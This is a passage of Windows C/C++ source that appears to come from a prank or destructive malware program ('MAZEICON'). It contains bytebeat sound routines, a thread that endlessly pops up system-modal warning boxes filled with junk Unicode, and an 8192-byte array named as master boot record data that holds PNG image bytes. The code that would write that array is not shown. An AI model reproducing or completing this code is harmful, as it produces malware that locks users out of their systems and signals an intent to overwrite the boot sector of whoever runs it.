	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat18() {//by UltraDasher965
	int nSamplesPerSec = 8192, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t >> 1 | t >> 6 ^ t >> 8) & 127) * 2) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat19() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((cos((t ^ t >> 2) * t >> 3) * (~t >> 4)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
DWORD WINAPI fe(LPVOID lpParam)
{
	while (true)
	{
		MessageBoxA(NULL, "MAZEICON NO SKID NO AI.\r\n\\ﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲﷲؓؓؓؓؓؓؓؓ\r\n\\ؓؓؓؓ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽\r\n\\ﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺﷺؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓؓ", NULL, MB_CANCELTRYCONTINUE | MB_HELP | MB_ICONWARNING | MB_DEFBUTTON2 | MB_SYSTEMMODAL | MB_RTLREADING);
	}
	return 0;
}
const unsigned char pcMbrData[8192] = {//this is a piece of shit
0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A,0x00,0x00,0x00,0x0D,0x49,0x48,0x44,0x52,0x00,0x00,0x01,0x2A,
0x00,0x00,0x00,0xB9,0x08,0x06,0x00,0x00,0x00,0x9F,0xBF,0x72,0x76,0x00,0x00,0x00,0x01,0x73,0x52,0x47,
0x42,0x00,0xAE,0xCE,0x1C,0xE9,0x00,0x00,0x00,0x04,0x67,0x41,0x4D,0x41,0x00,0x00,0xB1,0x8F,0x0B,0xFC,
0x61,0x05,0x00,0x00,0x00,0x09,0x70,0x48,0x59,0x73,0x00,0x00,0x0E,0xBF,0x00,0x00,0x0E,0xBF,0x01,0x38,
0x05,0x53,0x24,0x00,0x00,0x01,0x87,0x69,0x54,0x58,0x74,0x58,0x4D,0x4C,0x3A,0x63,0x6F,0x6D,0x2E,0x61,
0x64,0x6F,0x62,0x65,0x2E,0x78,0x6D,0x70,0x00,0x00,0x00,0x00,0x00,0x3C,0x3F,0x78,0x70,0x61,0x63,0x6B,
0x65,0x74,0x20,0x62,0x65,0x67,0x69,0x6E,0x3D,0x27,0xEF,0xBB,0xBF,0x27,0x20,0x69,0x64,0x3D,0x27,0x57,
0x35,0x4D,0x30,0x4D,0x70,0x43,0x65,0x68,0x69,0x48,0x7A,0x72,0x65,0x53,0x7A,0x4E,0x54,0x63,0x7A,0x6B,
0x63,0x39,0x64,0x27,0x3F,0x3E,0x0D,0x0A,0x3C,0x78,0x3A,0x78,0x6D,0x70,0x6D,0x65,0x74,0x61,0x20,0x78,
0x6D,0x6C,0x6E,0x73,0x3A,0x78,0x3D,0x22,0x61,0x64,0x6F,0x62,0x65,0x3A,0x6E,0x73,0x3A,0x6D,0x65,0x74,
0x61,0x2F,0x22,0x3E,0x3C,0x72,0x64,0x66,0x3A,0x52,0x44,0x46,0x20,0x78,0x6D,0x6C,0x6E,0x73,0x3A,0x72,
0x64,0x66,0x3D,0x22,0x68,0x74,0x74,0x70,0x3A,0x2F,0x2F,0x77,0x77,0x77,0x2E,0x77,0x33,0x2E,0x6F,0x72,
0x67,0x2F,0x31,0x39,0x39,0x39,0x2F,0x30,0x32,0x2F,0x32,0x32,0x2D,0x72,0x64,0x66,0x2D,0x73,0x79,0x6E,
0x74,0x61,0x78,0x2D,0x6E,0x73,0x23,0x22,0x3E,0x3C,0x72,0x64,0x66,0x3A,0x44,0x65,0x73,0x63,0x72,0x69,
0x70,0x74,0x69,0x6F,0x6E,0x20,0x72,0x64,0x66,0x3A,0x61,0x62,0x6F,0x75,0x74,0x3D,0x22,0x75,0x75,0x69,
0x64,0x3A,0x66,0x61,0x66,0x35,0x62,0x64,0x64,0x35,0x2D,0x62,0x61,0x33,0x64,0x2D,0x31,0x31,0x64,0x61,
0x2D,0x61,0x64,0x33,0x31,0x2D,0x64,0x33,0x33,0x64,0x37,0x35,0x31,0x38,0x32,0x66,0x31,0x62,0x22,0x20,
0x78,0x6D,0x6C,0x6E,0x73,0x3A,0x74,0x69,0x66,0x66,0x3D,0x22,0x68,0x74,0x74,0x70,0x3A,0x2F,0x2F,0x6E,
0x73,0x2E,0x61,0x64,0x6F,0x62,0x65,0x2E,0x63,0x6F,0x6D,0x2F,0x74,0x69,0x66,0x66,0x2F,0x31,0x2E,0x30,
0x2F,0x22,0x3E,0x3C,0x74,0x69,0x66,0x66,0x3A,0x4F,0x72,0x69,0x65,0x6E,0x74,0x61,0x74,0x69,0x6F,0x6E,
0x3E,0x31,0x3C,0x2F,0x74,0x69,0x66,0x66,0x3A,0x4F,0x72,0x69,0x65,0x6E,0x74,0x61,0x74,0x69,0x6F,0x6E,
0x3E,0x3C,0x2F,0x72,0x64,0x66,0x3A,0x44,0x65,0x73,0x63,0x72,0x69,0x70,0x74,0x69,0x6F,0x6E,0x3E,0x3C,
0x2F,0x72,0x64,0x66,0x3A,0x52,0x44,0x46,0x3E,0x3C,0x2F,0x78,0x3A,0x78,0x6D,0x70,0x6D,0x65,0x74,0x61,
0x3E,0x0D,0x0A,0x3C,0x3F,0x78,0x70,0x61,0x63,0x6B,0x65,0x74,0x20,0x65,0x6E,0x64,0x3D,0x27,0x77,0x27,
0x3F,0x3E,0x2C,0x94,0x98,0x0B,0x00,0x00,0xFE,0x12,0x49,0x44,0x41,0x54,0x78,0x5E,0xEC,0xBD,0x77,0x98,
0x14,0xC5,0xFA,0xF6,0xFF,0xA9,0xEE,0xC9,0xB3,0x39,0xB3,0x4B,0xCE,0x19,0x94,0x20,0x8A,0x80,0x20,0xA8,
0x88,0x28,0x82,0x80,0x01,0x73,0x3E,0x8A,0xF9,0x18,0x8F,0x01,0x3D,0xC7,0x74,0xCC,0xD9,0x63,0x8E,0x28,
0x08,0x12,0xC4,0x40,0x10,0x04,0x09,0x4A,0x90,0x9C,0x33,0x6C,0xCE,0x61,0x72,0x77,0xD7,0xEF,0x8F,0x9E,
0x99,0x9D,0xD9,0x5D,0x60,0x0D,0xE7,0xFB,0xFE,0xBE,0xEF,0xF5,0xDE,0x5C,0x37,0xDB,0x53,0x5D,0x33,0xD3,
0xD3,0x5D,0x7D,0xF7,0x53,0x4F,0x3D,0xF5,0x94,0x38,0xCB,0x85,0x4C,0xD1,0xA1,0xD4,0x01,0xD9,0x69,0x90,
0x97,0x6E,0x01,0x55,0x10,0x08,0x1A,0x74,0xCF,0xB5,0x92,0xEE,0xD4,0x09,0x1A,0x02,0xA9,0xC3,0x5B,0x45,
0x0A,0x95,0xE3,0x53,0x49,0xFC,0xB9,0x0E,0xEB,0x26,0x9D,0x0C,0xAB,0x15,0x84,0x00,0x40,0x4A,0x90,0x06,
0x48,0x05,0x0C,0x20,0x10,0x32,0x58,0x53,0xA1,0xD0,0xA2,0x65,0x47,0x5C,0x2E,0x37,0xEE,0xA4,0x64,0x1C,
0x36,0x07,0xAE,0x84,0x04,0xD6,0xAD,0xF9,0x09,0x69,0x18,0x34,0x1F,0x66,0xDD,0x21,0x43,0xFA,0xF3,0xCB,
0xEA,0x35,0xF8,0x02,0x82,0x9C,0xDC,0x36,0x1C,0x3E,0x54,0x89,0x31,0xE0,0x57,0x3E,0x1D,0x38,0x86,0xF3,
0xBB,0xFD,0x84,0x1E,0x00,0xDD,0x03,0x6A,0x36,0x54,0x6F,0x70,0x11,0x70,0xF9,0x68,0x33,0x0D,0x0C,0x43,
0x12,0xF2,0x5C,0x06,0xC0,0xC5,0x57,0xEB,0x91,0x43,0xC6,0x30,0x24,0xE5,0xBE,0x6D,0x48,0x21,0xD1,0x34,
0x9D,0xFE,0xFD,0x4F,0x41,0x4A,0x1D,0x55,0x55,0xA9,0xA9,0xAA,0x64,0xD3,0xA2,0x25,0x58,0xFC,0x5E,0x10,
0x12,0x10,0x04,0x0C,0x70,0xA6,0xA7,0x93,0x98,0xD3,0x82,0x1C,0x8B,0x81,0xAD,0xF6,0x20,0xED,0x32,0xAD,
0x54,0xD6,0xE9,0x58,0x9D,0x3A,0xA5,0x55,0x90,0xE2,0xB0,0x60,0x53,0x24,0xB3,0x97,0x4B,0x0E,0x05,0xD3,
0x09,0x19,0x06,0x17,0x5E,0xB5,0x98,0x9C,0xBC,0x8E,0x04,0xBD,0x06,0xE5,0x95,0xFB,0xA8,0x2A,0xDB,0x41,
0x49,0xFE,0xAF,0x04,0x02,0x5E,0x76,0xAE,0x7F,0x19,0x9B,0x02,0x13,0xFA,0x40,0x9F,0x56,0xF0,0xCD,0x26,
0xF8,0xF9,0x50,0xFD,0x2F,0x17,0x28,0x18,0x52,0x07,0x60,0xDA,0x5B,0xF0,0xE8,0xBA,0x7B,0xCC,0x1D,0xD6,
0x2E,0xF5,0x95,0x62,0xE1,0xE8,0xDE,0xB0,0x04,0xF1,0xD2,0xE9,0xE0,0x9A,0x13,0x79,0x05,0xC0,0xB3,0x81,
0xF1,0x00,0xFC,0xA6,0xEB,0xD8,0x81,0x76,0xBA,0x66,0xEE,0xD5,0x82,0x7C,0x9B,0x98,0xC2,0x83,0x97,0x7C,
0xCC,0xD9,0xEF,0x4E,0x88,0x7E,0xC6,0xFF,0x46,0x24,0x3A,0x9D,0xD4,0xFA,0x7C,0xD1,0xD7,0x76,0xAB,0x35,
0x6E,0xFF,0xFF,0x06,0xC8,0x69,0x8F,0xF0,0x48,0xCE,0x57,0xEC,0xCB,0x19,0xC5,0xAE,0x8D,0xBF,0xD0,0x63,
0xC0,0x48,0x6A,0x2B,0x0B,0xF0,0x55,0x3A,0x10,0x53,0xDF,0xA0,0x04,0x81,0x48,0x49,0xC1,0xE2,0xF1,0x70,
0x87,0xA2,0xF0,0x5B,0xA2,0x9B,0x8C,0xD2,0x1A,0x32,0xB3,0xB2,0xB9,0x72,0xC2,0x97,0xE0,0xDB,0x05,0x1C,
0x00,0xB5,0x18,0xF1,0xDE,0x7F,0xE8,0xDD,0xBB,0x37,0x57,0x5F,0x7D,0x0D,0x5D,0xBB,0x76,0xE5,0xE5,0x7D,
0xF3,0x00,0xF8,0x6E,0xB7,0x6C,0xF8,0xB5,0x8D,0xE1,0xCF,0x80,0xBF,0x8F,0x42,0x74,0x1A,0x4A,0x65,0xFF,
0xBE,0xA4,0xAC,0xFD,0x8D,0x15,0x6F,0xC1,0x90,0x9B,0x60,0xF6,0x34,0x18,0xFF,0x68,0xA4,0xE2,0x63,0x50,
0xB3,0x9E,0x9D,0x49,0xF3,0x59,0x17,0x0C,0xF0,0x43,0x62,0x32,0x00,0x8B,0x5C,0x2A,0x00,0xDD,0x1E,0x3F,
0x85,0xCB,0xDD,0x97,0x70,0xFE,0x05,0xE3,0x68,0xDB,0xFA,0x6D,0x42,0x32,0x15,0x80,0x80,0xF7,0x96,0xC8,
0x07,0x40,0xE8,0x71,0x94,0x94,0x56,0x20,0x92,0x90,0xD8,0x41,0x0A,0xC4,0x44,0x3B,0xB2,0x28,0x01,0xBA,
0x65,0x82,0x27,0x04,0x56,0x15,0x2C,0x02,0xEC,0x36,0x08,0xE9,0x10,0x34,0x04,0x43,0x3B,0xAA,0x1C,0xAE,
0x85,0x37,0xA4,0xE0,0x1A,0x21,0x59,0x7F,0x08,0x6C,0xC2,0x85,0x45,0x55,0x20,0xFC,0x1B,0x0D,0x09,0x86,
0x30,0x05,0xCB,0xAF,0xAB,0xAC,0xAD,0x82,0x56,0xAD,0xBB,0xE0,0x4A,0x48,0xC0,0x69,0x77,0x62,0x77,0xBB,
0x31,0x74,0x89,0xCF,0xE7,0xE3,0xC8,0x81,0xED,0xE8,0x86,0x79,0xF3,0x35,0x07,0x32,0xFC,0x1D,0x16,0x7C,
0xF8,0x82,0x0A,0xAD,0xDB,0x77,0x62,0xCF,0xCE,0x32,0x5E,0xFE,0x7B,0x5F,0x2E,0xED,0xF4,0x09,0xA4,0xB8,
0xD1,0x8C,0x44,0x44,0x41,0x11,0xF6,0xAC,0x34,0x70,0x04,0xD0,0x8B,0x3C,0x84,0xDA,0x9D,0x84,0xB1,0x63,
0x23,0x9F,0x6E,0xEF,0xC3,0x4F,0x05,0x5D,0x90,0x08,0xA4,0x04,0x21,0x04,0x42,0x84,0x85,0xCA,0xBF,0x0D,
0xA4,0x46,0x4A,0x72,0x2A,0xA1,0x10,0xE4,0xE4,0xB5,0xC0,0xEF,0xF7,0x90,0x7F,0xE8,0x30,0x09,0x85,0xFB,
0xA9,0xAC,0x0D,0x60,0x55,0x05,0x16,0x01,0x7E,0x61,0x21,0x94,0x90,0x46,0xBB,0x1E,0x5D,0xF1,0xEC,0xDF,
0x8F,0xA8,0x2D,0xC1,0x69,0x03,0xA1,0x68,0xA4,0x24,0x5A,0x29,0xF3,0x08,0xBA,0xE7,0x58,0xD8,0x57,0xE4,
0xE0,0xF3,0xD5,0x3E,0xDA,0x75,0x9B,0xC4,0xE0,0x73,0x9E,0x25,0x39,0x39,0x0D,0x6F,0xAD,0x87,0xEA,0xEA,
0xBD,0x54,0x94,0xED,0xA1,0xBC,0x68,0x23,0xFB,0xB7,0x7F,0x43,0x6D,0xE5,0x26,0xBE,0xBC,0x06,0x06,0xB6,
0x83,0x04,0x07,0x38,0x6D,0x30,0x7F,0x23,0x5C,0xF2,0x41,0xF8,0x77,0x5F,0xF5,0x0E,0x88,0xFD,0xF0,0xFE,
0x93,0x00,0x94,0x01,0x19,0xD7,0xFD,0x7E,0xA1,0xB2,0xBF,0x76,0x46,0x74,0x3B,0x68,0x9B,0x05,0x61,0xA1,
0xFA,0x4D,0xD7,0x71,0x03,0x19,0x86,0x8E,0x53,0xCA,0x38,0x91,0x8A,0x60,0xE8,0xAB,0x13,0x29,0x2E,0xCC,
0x27,0x2D,0x29,0xE6,0xC1,0x22,0xC2,0xD7,0x3B,0x2C,0x6E,0x81,0x60,0x80,0x90,0xDF,0x87,0xA6,0x05,0x31,
0x0C,0x03,0x4D,0x0B,0x51,0xE7,0xA9,0xC5,0x90,0x92,0x8E,0x9D,0xFB,0x00,0xB0,0xDE,0x9B,0x8C,0x06,0x8C,
0xEB,0x68,0x36,0xCC,0x86,0xB0,0xA5,0xDB,0x90,0xED,0xEA,0x5F,0x2B,0xAD,0x94,0xD8,0xDD,0x90,0x60,0xBE,
0x96,0xD3,0x83,0xF1,0xE5,0xFF,0x97,0x23,0xF0,0xD0,0xFD,0xDC,0xD3,0x7E,0x3E,0x25,0x19,0xA3,0xD8,0xB2,
0x66,0x29,0x3D,0x07,0x8D,0xC4,0x53,0x59,0x4C,0xFE,0xAF,0x65,0xE4,0xBD,0xF6,0x0D,0x9D,0xA5,0x4A,0x8A,
0xDD,0x8E,0xD7,0x90,0x74,0x57,0x24,0xDB,0xD3,0xD3,0x49,0x2D,0x28,0x23,0x3B,0xAF,0x05,0x97,0x9E,0xF7,
0x15,0xF8,0xF6,0x01,0x47,0x40,0x29,0x47,0xF9,0xF0,0x69,0x7A,0xF7,0xEE,0xCD,0x95,0x57,0x5E,0x49,0xD7,
0xAE,0x5D,0x79,0xA7,0xF2,0x2B,0x00,0x6E,0x5E,0xF3,0x63,0xC3,0xAF,0x6D,0x12,0xA3,0x2C,0x5F,0x20,0xE6,
0xFF,0x9D,0x6B,0xDF,0x1C,0xC3,0xBB,0x23,0xEF,0x6B,0x24,0x54,0x42,0x08,0xA4,0xEF,0x7C,0x08,0xEA,0x48,
0x54,0x5E,0xB5,0x7C,0xC4,0xBE,0x4C,0xF3,0xA2,0xCE,0x72,0x87,0x00,0xE8,0x76,0x7F,0x6F,0x2E,0x49,0xB9,
0x9A,0x0B,0x2E,0x18,0x47,0x7A,0x7A,0x26,0x8E,0xC4,0x97,0xD0,0x8D,0x44,0x42,0x9E,0x6B,0xEB,0xBF,0x28,
0xF8,0x04,0x4A,0x5A,0x1E,0x90,0x04,0x38,0x90,0x52,0xA0,0x14,0xBA,0xC0,0x30,0x04,0x3B,0xCA,0xA0,0xC0,
0x0B,0x01,0x0D,0x7C,0xBA,0x20,0x10,0x34,0x2D,0x24,0x2D,0x24,0x59,0xB9,0x5B,0x63,0xFD,0x7E,0x8D,0x73,
0xCA,0x75,0x5A,0xBB,0x61,0x72,0x0F,0x85,0xCC,0x04,0x01,0xD2,0x6C,0xB0,0x32,0x46,0xA4,0x8E,0x78,0x04,
0x07,0xED,0xAD,0x68,0xDD,0xB6,0x1B,0xC9,0xA9,0xA9,0xB8,0x13,0x12,0xB1,0x39,0x9D,0x04,0xFC,0x01,0xEA,
0x6A,0x2B,0x09,0xF9,0x6B,0xB0,0x3B,0x5D,0xD8,0xEC,0x8E,0x66,0xD3,0x62,0xB5,0x62,0xB1,0x5A,0xF1,0x06,
0x2D,0x24,0xA5,0xA4,0x71,0xF8,0xA0,0x95,0x8A,0xB7,0xB6,0x71,0x69,0xDB,0x4F,0x30,0x0C,0x90,0x96,0x3C,
0x54,0x61,0xC1,0x0E,0x48,0x77,0x2F,0x02,0x7A,0x06,0xF4,0xBC,0x0E,0x7B,0xDA,0x70,0x1C,0x03,0xEE,0xE4,
0xE6,0x09,0x59,0x3C,0xDB,0x6F,0x0E,0x52,0x4A,0x24,0x12,0x43,0xEA,0x48,0x24,0x42,0x01,0x43,0xD7,0x69,
0xD7,0xBA,0x1D,0x9A,0x16,0xA2,0xAA,0xA6,0x82,0xED,0xDB,0xB7,0x70,0x70,0xDF,0x41,0x8C,0x92,0x22,0x7C,
0x7E,0x1D,0x21,0xC1,0x6D,0xB5,0xA0,0x4B,0x89,0x94,0x12,0xA5,0xBC,0x98,0xCD,0xCB,0xD6,0xA3,0x7A,0x4A,
0x08,0x69,0x06,0x55,0x1E,0x9D,0xEA,0x5A,0xC1,0xC1,0x42,0x83,0xD2,0x6A,0x83,0x59,0xBF,0x3A,0x99,0xB5,
0x4E,0xA5,0xFF,0x19,0xFF,0xE4,0xAC,0x49,0xEF,0xE2,0x76,0xA7,0x50,0x59,0x76,0x90,0x92,0x92,0x75,0x1C,
0x3D,0xB0,0x9C,0xA2,0x23,0x6B,0xD8,0xB4,0xEA,0x69,0xDA,0x5A,0x37,0x71,0xE0,0x09,0x18,0x7F,0x32,0xB4,
0x4A,0x83,0x74,0xB7,0x69,0x9C,0x56,0xF9,0x61,0x72,0x5F,0x90,0x37,0xAD,0x46,0x4A,0x1B,0x48,0x47,0xFD,
0x05,0x8C,0x85,0x90,0x4D,0x93,0xA6,0x58,0x0F,0x5B,0x70,0x42,0x9C,0x48,0x45,0xE0,0x0B,0x06,0x8E,0x29,
0x52,0x71,0x08,0x8B,0x54,0x04,0x11,0x91,0x8A,0x40,0xD7,0xB4,0xA8,0x48,0x45,0x70,0x22,0x91,0x02,0x08,
0x96,0x9F,0x40,0x80,0xEA,0x4C,0xA1,0x2C,0xBA,0xFA,0x7F,0xB7,0x95,0xF7,0x3F,0x0A,0x25,0x11,0x2C,0x59,
0x60,0x69,0x0D,0x96,0xF6,0x0C,0x1A,0x34,0x88,0x1E,0x3D,0x7A,0xE0,0x76,0xBB,0x09,0x85,0x42,0x24,0xA6,
0xE6,0x92,0x98,0x9A,0xCB,0x73,0x5D,0x7B,0x36,0x8B,0xB1,0x98,0xF6,0x56,0xFD,0x76,0xBD,0x35,0x55,0x0F,
0xA1,0xAA,0xDC,0xC6,0x95,0xBC,0xC2,0x47,0xBC,0xC2,0x47,0xE4,0x7B,0x3E,0x27,0xDF,0xF3,0x39,0x8B,0x1F,
0xBE,0xBF,0x61,0x55,0x0C,0x61,0xB6,0x44,0xD3,0x80,0x10,0x08,0xFB,0x23,0xB1,0x7B,0x01,0x89,0x62,0x77,
0xA8,0x58,0x2C,0xE0,0xB6,0x0B,0xD2,0x13,0xA0,0x46,0x2A,0xA0,0x08,0x6A,0xB1,0x52,0x13,0x80,0x44,0x2B,
0xD8,0x14,0xB0,0x5A,0x05,0x36,0x24,0x25,0x35,0x06,0x76,0x9B,0xD9,0x7D,0x48,0x71,0x99,0x8D,0x51,0x03,
0x74,0xA9,0xB0,0xB6,0x2E,0x01,0x7F,0x7A,0x27,0x12,0x93,0xD3,0x48,0x4E,0x49,0xC5,0xEE,0x4C,0x00,0x45,
0xC1,0xE7,0xF5,0x10,0xF0,0x79,0x08,0x06,0x02,0x84,0x34,0x1D,0xAB,0xC5,0xD6,0x48,0x8C,0x8E,0x47,0xBB,
0xC3,0x85,0xDD,0xE1,0xA2,0x55,0xAB,0xD6,0xD8,0x84,0x9D,0xD2,0xB7,0x16,0x82,0xD5,0x40,0x4D,0x16,0x88,
0x8E,0x17,0x61,0xF3,0x1F,0xC1,0x12,0xD2,0xD0,0x13,0x05,0x96,0xF4,0x33,0x91,0xCE,0xA1,0x78,0x0B,0xF7,
0x20,0x83,0x3E,0x74,0x74,0xEA,0xEC,0x9D,0x48,0x68,0x9D,0xC8,0xE7,0x43,0x67,0xA3,0x20,0x11,0x80,0x34,
0x0C,0xA4,0x61,0xD0,0x26,0xAF,0x35,0x3B,0x77,0xEF,0xA4,0xAC,0xAA,0x1A,0x0C,0x03,0x89,0x4A,0x48,0x0B,
0x91,0xEB,0x0E,0xA0,0xA3,0x13,0x30,0xA0,0xB0,0x36,0x88,0x40,0xA2,0xEA,0x21,0x42,0x1A,0x74,0x4B,0x09,
0x12,0x08,0xE8,0x20,0x41,0x4A,0x81,0x26,0x25,0xBE,0x50,0x12,0xDB,0x0E,0xA6,0x50,0xA1,0x0E,0xA2,0xEB,
0x80,0x5B,0xE9,0x37,0xE8,0x06,0xF4,0x80,0x4E,0x6D,0xD5,0x61,0x4A,0xCB,0x76,0x72,0x74,0xFF,0xCF,0x78,
0xAA,0x8F,0xB2,0x63,0xED,0x4B,0xFC,0x73,0xB4,0xCE,0xE6,0x69,0xD0,0x36,0x03,0x14,0x05,0xD4,0x70,0x77,
0x59,0x08,0xD0,0x42,0x30,0x7C,0x6F,0x3A,0x48,0x27,0x42,0x26,0x82,0x4C,0x8B,0xB9,0x68,0x80,0xE1,0x34,
0x29,0xED,0x4D,0x13,0x6B,0x23,0x06,0x35,0x2D,0x8E,0xF7,0xEA,0xF5,0xD6,0x6C,0x86,0xA1,0x43,0xC0,0xCF,
0xE2,0xDC,0x96,0x68,0x6E,0x37,0xBA,0xEF,0x20,0x84,0x45,0x2A,0x82,0xA8,0x35,0x15,0xEE,0x32,0x83,0x69,
0x4D,0xC5,0x8A,0x94,0xA6,0x05,0x09,0x05,0x83,0x04,0x02,0x7E,0x6C,0x16,0x1B,0x00,0x1D,0x3B,0xF7,0x89,
0x8A,0x54,0x73,0x10,0x5A,0x17,0x24,0xB4,0x2E,0xD8,0xD8,0x9A,0x0A,0x63,0x63,0x8B,0x1B,0x28,0x4E,0x6D,
0x41,0xD1,0xD5,0x13,0x1A,0xFD,0xA6,0xFF,0x5B,0x89,0x16,0x42,0x51,0x04,0x48,0x1D,0x8B,0xD5,0x86,0xA6,
0x79,0x31,0x0C,0x9D,0x82,0xDF,0xF6,0x72,0x54,0x0A,0x7A,0xA2,0x32,0x48,0x0A,0xFA,0x58,0xED,0x08,0xC0,
0x66,0x75,0x60,0x51,0x55,0xAC,0xAA,0x02,0x96,0x54,0x70,0xB5,0x02,0x57,0x27,0x70,0xF6,0xE0,0xDA,0x6B,
0xAF,0xE5,0xEC,0xB3,0xCF,0x26,0x39,0x39,0x99,0x40,0x20,0xC0,0xB6,0xB5,0x8B,0xD9,0xB6,0x76,0x31,0x76,
0xB7,0xBB,0x59,0x44,0xDF,0x87,0x3C,0xEF,0x0B,0xFC,0x25,0x1B,0xB9,0xFD,0xBD,0x93,0xE2,0xAE,0xCD,0xEC,
0x69,0xE1,0x0D,0x2D,0x04,0x4A,0x33,0xBA,0x92,0x61,0xF8,0x6B,0xA7,0x32,0xE1,0xDC,0xD9,0x58,0x12,0x66,
0x37,0xDC,0x05,0x98,0xC6,0x01,0x48,0xC4,0x59,0xB9,0x8A,0x54,0x55,0x70,0xD8,0x0C,0xAC,0x56,0xF3,0xC6,
0x53,0x1C,0x09,0x68,0x3E,0x3F,0xB6,0x90,0x69,0xAE,0x15,0xD5,0x42,0xCB,0x14,0xB0,0x58,0x4C,0x81,0xEB,
0x90,0xA3,0xD0,0x21,0xCB,0xCA,0xF7,0x3B,0x1C,0x18,0x02,0xF2,0x3D,0x0E,0xB6,0xFB,0x1D,0x24,0xA5,0x66,
0x91,0x92,0x92,0x8E,0xCD,0xE9,0x44,0xB5,0xD8,0xD0,0xB5,0x20,0xC1,0x60,0x10,0x3D,0x10,0x44,0xD3,0x43,
0x80,0x34,0x9F,0xC6,0xD2,0x20,0xF4,0x7B,0x7C,0x54,0xE1,0x2E,0x46,0x65,0x65,0x88,0x82,0xE7,0x37,0x10,
0x90,0x20,0x32,0x01,0x31,0x06,0x9B,0xBD,0x8A,0xE0,0xD1,0x95,0xD8,0xD3,0x4F,0xC1,0x9F,0x32,0x0C,0x7B,
0x30,0x48,0x40,0x18,0x58,0x53,0xB3,0x08,0xD6,0x54,0x60,0x11,0x5E,0xF4,0x94,0x01,0x28,0xC1,0x52,0x6C,
0x9E,0xDF,0xF0,0x6F,0x99,0xCF,0x95,0x3F,0x8C,0xC1,0x90,0x12,0x45,0x08,0xF6,0x14,0xAC,0xC0,0x6A,0x73,
0x60,0xB5,0x5A,0x91,0xD2,0x14,0xAF,0x0C,0x6F,0x05,0x89,0x8A,0x97,0xF2,0x6A,0x1D,0x4D,0x33,0x30,0xA4,
0x82,0x21,0x25,0x0E,0x9B,0x15,0x9B,0x22,0xD0,0xA4,0x81,0x82,0x81,0x6E,0x80,0x94,0x06,0x01,0x23,0x83,
0x0D,0x85,0xB9,0x9C,0x72,0xE6,0x34,0xDC,0xEE,0x4C,0x72,0x72,0x7B,0xA3,0xA1,0x52,0x51,0xB1,0x95,0xDA,
0xAA,0x23,0x54,0x96,0xEC,0xA3,0xBA,0x7C,0x3B,0x7B,0xB7,0x7E,0xC8,0xF6,0x7F,0x40,0xB7,0x3C,0xD3,0x2A,
0x51,0x22,0xBE,0x32,0x69,0xDA,0x3D,0xB7,0xDD,0xA9,0x90,0x1D,0x30,0xC8,0x70,0x26,0xF3,0xB7,0x6B,0x36,
